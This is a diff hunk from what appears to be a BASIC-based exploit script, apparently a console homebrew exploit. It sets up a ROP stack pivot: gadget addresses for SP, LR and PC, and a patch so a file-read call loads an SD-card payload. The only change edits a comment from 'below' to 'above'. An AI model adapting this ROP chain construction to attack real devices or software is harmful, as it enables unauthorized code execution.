@@ -81,7 +81,7 @@ P ROPKIT  'patch the final arg (DEST) of iread to point sd payload (ropkit) to t
 'BLX             R1    (we use a ldmdb r0! SPivot here to get control)
 ''''''end codebin asm, the following basic instructions exploit above asm
 A=S-12     '3FFFF4 
-P ROP      '3FFFF4 SP - move stack to initial rop payload below
+P ROP      '3FFFF4 SP - move stack to initial rop payload above
 P 0        '3FFFF8 LR - don't care
 P POP_PC   '3FFFFC PC - write POPPC gadget to start initial rop payload
 P S        '400000 R0 - make sure stack pivot gadget is loading data into regs from the correct base address 400000
